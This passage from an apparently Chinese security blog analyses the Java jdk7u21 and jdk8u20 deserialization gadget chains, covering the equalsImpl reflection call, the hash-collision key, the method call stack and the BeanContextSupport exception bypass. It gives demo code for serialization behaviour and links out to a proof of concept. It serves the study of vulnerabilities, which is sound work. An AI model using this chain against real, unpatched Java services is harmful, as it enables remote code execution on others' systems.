var5.invoke(var1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(var12);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断var7和var8是否相等</span></span><br><span class="line"><span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易看到这里有个明显的反射调用，有可能可以任意反射 <code>RCE</code> ，因此我们可以来看一下这个方法的流程和参数如何控制。</p><p>首先看参数，这个方法中使用了的属性只有 <code>this.type</code> 和 <code>this.memberValues</code> ，而在这个类的构造方法中我们可以看到，这两个属性是直接根据构造方法的传入的参数赋值的，因此可以完全可控。</p><blockquote><p>这里说明一下这两个参数的作用，<code>type</code> 属性存储被动态代理的是哪个类，<code>memberValues</code> 属性存储当前动态代理的成员属性 <code>Map</code> ，可以把 <code>String</code> 类型的 <code>key</code> 当作属性名，<code>Object</code> 类型的 <code>value</code> 当作属性值。</p></blockquote><p><img src="/imgs/Pasted%20image%2020240226151207.png"></p><p>接下来我们分析一下这个方法的逻辑。这个方法的本质目的是在判断当前动态代理的对象和传入的 <code>var1</code> 参数是否等效。这里判断的逻辑是先根据 <code>getMemberMethods</code> 获取动态代理的原本类（原本类存在 <code>AnnotationInvocationHandler</code> 中的 <code>type</code> 属性中）的所有方法。</p><p><img src="/imgs/Pasted%20image%2020240226151711.png"></p><p>然后通过 <code>this.asOneOfUs(var1)</code> 判断 <code>var1</code> 是一个普通对象还是也是动态代理的对象，如果不是动态代理对象就返回 <code>null</code> ，反之返回那个动态代理对象的 <code>InvocationHandler</code> 。</p><p><img src="/imgs/Pasted%20image%2020240226152243.png"><br>接下来进入 <code>if</code> 判断语句，如果 <code>var9 != null</code> ，将当前判断的 <code>equals</code> 两边都为动态代理的对象，就根据二者 <code>memberValues</code> 属性是否一致来判断二者是否一致。不然就通过对 <code>var1</code> 来调用当前动态代理对象的方法，看其返回值和当前动态代理对象的 <code>memberValues</code> 存储的是否一致。</p><blockquote><p>从上面我们可以分析出来，开发者员原本心里想的应该是 <code>memberValues</code> 存储的是方法名和其返回值的映射。</p></blockquote><p>根据上面的分析，<code>equalsImpl</code> 方法是可以利用的，但是现在的关键是怎么调用 <code>equalsImpl</code> 。我们可以它只在 <code>AnnotationInvocationHandler.invoke()</code> 方法中被调用了。但是熟悉动态代理的人就知道 <code>invoke()</code> 这个方法是很好调用的，那现在的关键就差最后一步了。能不能控制 <code>invoke()</code> 方法以我们构造的恶意参数走到 <code>equalsImpl()</code> 的方法调用上。</p><p><img src="/imgs/Pasted%20image%2020240226153925.png"></p><p>这一看就可以，就不细说了。接下来的步骤就稍微简单了，调用一个动态代理的 <code>equals</code> 方法，传入 <code>TemplatesImpl</code> 对象。</p><p>这里使用 <code>HashSet.readObject()</code> -&gt; <code>HashMap.put()</code> -&gt; <code>任意对象.equals()</code> 的 <code>Gadget</code> 。</p><p><img src="/imgs/Pasted%20image%2020240226154519.png"></p><p><img src="/imgs/Pasted%20image%2020240226154158.png"></p><p>原理这里简单介绍一下，这里在 <code>HashSet.readObject()</code> 的时候，会把其里面的元素都放到一个 <code>map</code> 中作为 <code>key</code> ，<code>value</code> 为一个空的 <code>Object</code> 对象。然后在 <code>Map.put()</code> 中，会计算当前 <code>put</code> 的元素的 <code>hash</code> 值，然后判断是否和当前 <code>hash</code> 表中的元素有重复的，如果是重复的就替换，反之就新加入 <code>map</code> 。关键就是在这里判断是否重复的逻辑，需要先让两个 <code>map</code> 中的元素 <code>hash</code> 值相同，但是元素不同才会调用 <code>equals()</code> 方法。因此这里我们需要想办法 <code>hash</code> 碰撞来调用 <code>equals()</code> 方法，对应到 <code>poc</code> 的逻辑就是需要让 <code>map</code> 中的两个元素在不相同的情况下 <code>hash</code> 值相等。</p><p><img src="/imgs/Pasted%20image%2020240226163912.png"></p><p>我们可以发现 <code>poc</code> 确实实现了这点，但是是怎么实现的呢？两个不同的元素 <code>hash</code> 怎么保证一样。</p><p>其实是因为这里根据 <code>poc</code> 的构造， <code>map</code> 第二个放入的元素是第一个放入的元素的动态代理，两个元素是有一定关系的，所以其 <code>hash</code> 的计算也应该有一定的关系。第一个对象没有重写 <code>hashcode</code> 方法所以我们没办法控制，然后我们可以分析动态代理对象的 <code>hash</code> 计算方式，发现它是重写了计算 <code>hash</code> 的代码的。</p><p><img src="/imgs/Pasted%20image%2020240226170040.png"></p><p><img src="/imgs/Pasted%20image%2020240226170118.png"></p><p>根据动态代理 <code>hash</code> 的计算，我们可以发现需要满足 <code>((String)var3.getKey()).hashCode()</code> 的值为 <code>0</code> 就可以让动态代理的对象和被动态代理的对象的 <code>hash</code> 相同。也就是我们需要找一个字符串的 <code>hash</code> 为 <code>0</code> ，通过爆破，我们可以找到 <code>f5a5a608</code> 这个字符串。</p><p><img src="/imgs/Pasted%20image%2020240226170537.png"></p><p>从而我们可以看到 <code>poc</code> 中给 <code>map</code> 设置的 <code>key</code> 为 <code>f5a5a608</code> 。（类似的字符串还有很多）</p><h2 id="方法调用栈"><a href="#方法调用栈" class="headerlink" title="方法调用栈"></a>方法调用栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">HashMap.put()</span><br><span class="line">Proxy.equals()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">AnnotatiopnInvocationHandler.equalsImpl()</span><br><span class="line">任意对象方法调用（利用TemplatesImpl.getOutputProperties()命令执行）</span><br></pre></td></tr></table></figure><h1 id="jdk8u20反序列化"><a href="#jdk8u20反序列化" class="headerlink" title="jdk8u20反序列化"></a>jdk8u20反序列化</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>提前做好这个漏洞分析比较难的准备。这里会先给出思路，然后想办法去实现，思路很难想到，只能照着学习。</p></blockquote><p><code>jdk8u20</code> 是对 <code>jdk7u21</code> 漏洞的绕过。<code>jdk7u21</code> 的漏洞修复方法主要是下面两个点：</p><ol><li>在 <code>AnnotationInvocationHandler</code> 的构造方法中加入对传入参数类型的限制。</li></ol><p><img src="/imgs/Pasted%20image%2020240226205047.png"></p><p>不过这一点比较好绕过，我们可以通过反射在调用构造方法以后再修改 <code>AnnotationInvocationHandler</code> 的属性。</p><ol start="2"><li>在 <code>AnnotationInvocationHandler.readObject()</code> 方法中对异常进行抛出，而非直接 <code>return</code> 。</li></ol><p>存在漏洞的版本：</p><p><img src="/imgs/Pasted%20image%2020240226205559.png"></p><p>修复后的版本：</p><p><img src="/imgs/Pasted%20image%2020240226205717.png"></p><p>这一点的绕过就是 <code>jdk8u20</code> 漏洞的关键所在。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>由于 <code>jdk8u20</code> 漏洞绕过比较难，这里需要提前说一些后面需要用到的前置知识。</p><h3 id="1-异常抛出终止程序运行的绕过"><a href="#1-异常抛出终止程序运行的绕过" class="headerlink" title="1.异常抛出终止程序运行的绕过"></a>1.异常抛出终止程序运行的绕过</h3><p>这里直接给出结论：</p><blockquote><p>在一个存在 <code>try-catch</code> 块并且没有抛出异常的方法中如果调用了另一个存在 <code>try-catch</code> 块并且抛出了异常的方法，如果被调用方法抛出了异常，那么被调用方法会中断执行，但是外层的调用方法不会中断执行。</p></blockquote><p>下面给出一个示例代码测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="number">111</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            System.out.println(<span class="number">222</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            func1();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="number">333</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        func2();</span><br><span class="line">        System.out.println(<span class="number">444</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="/imgs/Pasted%20image%2020240226211804.png"></p><h3 id="2-序列化和反序列化的流程"><a href="#2-序列化和反序列化的流程" class="headerlink" title="2.序列化和反序列化的流程"></a>2.序列化和反序列化的流程</h3><p>直接给出结论：</p><blockquote><p>在对一个对象序列化和反序列化的时候，如果 <code>writeObject</code> 方法和 <code>readObject</code> 方法中存在了 <code>defaultWriteObject()</code> 和 <code>defaultReadObject()</code> 的调用，那么会在其中继续对其属性的对象调用 <code>writeObject</code> 方法和 <code>readObject</code> 方法。</p></blockquote><p>测试如下：</p><p><img src="/imgs/Pasted%20image%2020240227001751.png"></p><p><img src="/imgs/Pasted%20image%2020240227001313.png"><br><img src="/imgs/Pasted%20image%2020240227001329.png"></p><h3 id="3-readObject-和defaultReadObject-区别的理解"><a href="#3-readObject-和defaultReadObject-区别的理解" class="headerlink" title="3.readObject()和defaultReadObject()区别的理解"></a>3.readObject()和defaultReadObject()区别的理解</h3><p><code>defaultReadObject()</code> 的作用是按照默认的方式依次调用当前类所有属性的 <code>readObject()</code> 方法，并且将其返回值赋给其对应的属性。<br><code>readObject()</code> 的作用是读取字节流中的下一个 <code>object</code> 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String str1;</span><br><span class="line">    <span class="keyword">public</span> String str2;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ois.readObject() = &quot;</span> + ois.readObject());</span><br><span class="line">        System.out.println(<span class="string">&quot;ois.readObject() = &quot;</span> + ois.readObject());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        test.str1 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        test.str2 = <span class="string">&quot;2&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;demo.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(test);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;demo.ser&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;ois.readObject() = &quot;</span> + ois.readObject());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Test&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;str1=&#x27;&quot;</span> + str1 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, str2=&#x27;&quot;</span> + str2 + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以如果我们运行上面的代码，结果会如下：</p><p><img src="/imgs/Pasted%20image%2020240227012432.png"></p><p>会发现 <code>Test</code> 对象的属性无法成功反序列化成功。这是因为 <code>Test</code> 类的重写的 <code>readObject()</code> 方法中没有使用 <code>defaultReadObject()</code> ，从而不会将字节流读取的到值自动赋给属性，需要我们手动按照属性的顺序一个个顺序赋值。</p><p>如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">str1 = (String) ois.readObject();</span><br><span class="line">str2 = (String) ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，如果上面 <code>Test</code> 类中重写的 <code>readObject()</code> 调用的 <code>readObject()</code> 少了一个，会发现 <code>main()</code> 中的 <code>readObject()</code> 不会是 <code>Test</code> 类中未读取的第二个属性的值。根据运行结果说明，如果重写的 <code>readObject()</code> 方法中手动反序列化赋值的参数少了，并不会按顺序排到后面的 <code>readObject()</code> 方法中，而是直接被抛弃了。原理以后再分析，现在先只需要知道结论。</p><p><img src="/imgs/Pasted%20image%2020240227013009.png"></p><h3 id="4-对同一个对象只会进行一次序列化和反序列化"><a href="#4-对同一个对象只会进行一次序列化和反序列化" class="headerlink" title="4.对同一个对象只会进行一次序列化和反序列化"></a>4.对同一个对象只会进行一次序列化和反序列化</h3><p>这里也直接给出结论：</p><blockquote><p>当 <code>java</code> 在多次写入同一个对象到字节流时，那么这个对象只会调用一次 <code>writeObject()</code> 方法。<br>同理当 <code>java</code> 在反序列化一个字节流时，如果此字节流中序列化了同一个对象多次，那么这个对象只会被调用一次 <code>readObject()</code> 方法。</p></blockquote><p>下面给出示例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Address address;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User#readObject is called&quot;</span>);</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User#writeObject is called&quot;</span>);</span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;address=&quot;</span> + address +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.beancontext.BeanContext;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String path;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Address#readObject is called&quot;</span>);</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Address#writeObject is called&quot;</span>);</span><br><span class="line">        oos.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Address&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;path=&#x27;&quot;</span> + path + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>();</span><br><span class="line">        address.path = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        user.address = address;</span><br><span class="line">        </span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;demo.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line"></span><br><span class="line">        oos.writeObject(user);</span><br><span class="line">        oos.writeObject(address);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;demo.ser&quot;</span>));</span><br><span class="line">        System.out.println(<span class="string">&quot;ois.readObject() = &quot;</span> + ois.readObject());</span><br><span class="line">        System.out.println(<span class="string">&quot;ois.readObject() = &quot;</span> + ois.readObject());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="/imgs/Pasted%20image%2020240227000351.png"></p><p>如果这里第一次写入的 <code>user</code> 对象的 <code>address</code> 属性和第二次写入的 <code>address</code> 对象不一致，那么 <code>Address</code> 还是会调用两次 <code>writeObject</code> 和 <code>readObject</code> 。</p><p><img src="/imgs/Pasted%20image%2020240227000731.png"></p><h2 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p><strong>根据第一个前置知识</strong> ，我们就有了一个绕过 <code>AnnotationInvocationHandler.readObject()</code> 中异常抛出的思路：</p><blockquote><p>寻找一个外层方法来调用 <code>AnnotationInvocationHandler.readObject()</code> ，并且不会抛出异常。</p></blockquote><p>但这只是第一步，后面的步骤就很难想了。这里直接给出结论：</p><blockquote><p>我们需要寻找一个类，满足下面四个要求：</p><ol><li>重写了 <code>readObject()</code> 方法。</li><li>在 <code>readObject()</code> 方法中存在 <code>try-catch</code> 语句。（可以是间接存在，比如 <code>readObject</code> 调用了 <code>A</code> 方法，<code>A</code> 方法中存在 <code>try-catch</code> 语句）</li><li>并且在 <code>try-catch</code> 语句中调用了 <code>ois.readObject()</code> 。</li><li>并且 <code>try-catch</code> 语句没有抛出异常。  （这个要求是关键！）<br>这里可以发现 <code>jdk</code> 原生的 <code>java.beans.beancontext.BeanContextSupport#readObject()</code> 方法满足条件，这个方法调用了 <code>this.readChildren()</code> 方法，并且在 <code>this.readChildren()</code> 中存在上面满足条件的 <code>try-catch</code> 语句。</li></ol></blockquote><p><img src="/imgs/Pasted%20image%2020240226212657.png"><br><img src="/imgs/Pasted%20image%2020240226223023.png"></p><p>这里我们先不需要知道为什么要这么找，等到后面的分析就知道了。</p><p>寻找好了利用类，这里直接给出利用思路： </p><p>思路一：</p><p>在 <code>jdk7u21</code> 链子序列化后的字节码文件中给 <code>HashSet</code> 类对象强行加一个 <code>BeanContextSupport</code> 类的属性，然后给这个属性也强行加一个 <code>AnnotationInvocationHandler</code> 类的属性。<br>从而根据第二个前置知识，我们可以知道， <code>HashSet.readObject()</code> 中的 <code>defaultReadObject()</code> 会触发其属性的 <code>BeanContextSupport.readObject()</code> （ <strong>根据第二个前置知识</strong> ），再在 <code>BeanContextSupport.readObject()</code> 中通过 <code>readObject()</code> 触发 <code>AnnotationInvocationHandler.readObject()</code> （ <strong>根据第三个前置知识</strong> ） ，从而防止 <code>AnnotationInvocationHandler.readObject()</code> 的异常终止程序。</p><p>但是你可能会疑惑这里的逻辑有点问题，按照这里的说法加上 <code>jdk7u21</code> 链子的逻辑，<code>AnnotationInvocationHandler.readObject()</code> 应该会在 <code>HashSet.readObject()</code> 中调用两次：</p><p><img src="/imgs/Pasted%20image%2020240227014008.png"></p><p><code>BeanContextSupport</code> 绕过的是第一次 <code>AnnotationInvocationHandler.readObject()</code> 因为异常终止程序，那怎么绕过第二次呢？</p><p>这里就要用到 <strong>第四个前置知识</strong> ，我们只要让两次的 <code>AnnotationInvocationHandler</code> 类对象为同一个，那么第二次反序列化时就不会再次调用 <code>AnnotationInvocationHandler</code> 的 <code>readObject</code> 方法了。</p><p>这样逻辑思路就捋通了，接下来就是构造 <code>poc</code> 了。</p><p>思路二：</p><p>类似于思路一，只是换了个 <code>BeanContextSupport</code> 对象在 <code>HashSet</code> 中的位置。我们可以让 <code>BeanContextSupport</code> 对象也成为 <code>HashSet</code> 中的一个元素，这样就可以让它在最后的 <code>for</code> 循环中被调用 <code>readObject</code> 方法了。不过需要注意 <code>BeanContextSupport</code> 对象要在动态代理的对象之前放入 <code>HashSet</code> ，从而让它先反序列化。<br>此时 <code>HashSet</code> 中应有三个元素，按照顺序是：<br><code>BeanContextSupport</code> -&gt; <code>Templates</code> -&gt; <code>Proxy</code> 。</p><h2 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h2><p>这里构造 <code>poc</code> 是一个难点，需要很了解序列化后结果的结构。先参考 <a href="java%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E8%8A%82%E6%B5%81%E7%9A%84%E7%BB%93%E6%9E%84.md">java序列化字节流的结构</a> 来了解这一部分。这里分析起来太复杂了，而且用到的场景也不多，知道其大致的原理就是修改序列化的字节，给对象添加其本没有的字段就可以了。如果以后遇到相似的场景可以再来细致的分析字节。</p><p><code>POC</code> 参考： <a href="https://github.com/pwntester/JRE8u20_RCE_Gadget">https://github.com/pwntester/JRE8u20_RCE_Gadget</a> </p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a 